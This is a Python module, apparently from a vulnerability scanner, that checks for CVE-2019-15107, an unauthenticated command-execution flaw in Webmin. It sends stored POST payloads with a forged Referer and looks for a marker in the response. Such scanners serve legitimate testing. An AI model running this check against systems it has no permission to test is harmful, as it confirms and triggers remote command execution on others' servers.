#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests

def cve_2019_15107_scan(self, url):
    ''' 该漏洞存在于密码重置页面(password_change.cgi), 允许未经身份验证的用户通过简单的POST请求执行任意命令
        当用户开启Webmin密码重置功能后, 攻击者可以通过发送POST请求在目标系统中执行任意命令, 且无需身份验证。
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2019-15107'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Referer': 'https://{}/session_login.cgi'.format(logger.get_domain(url))
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2019_15107_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
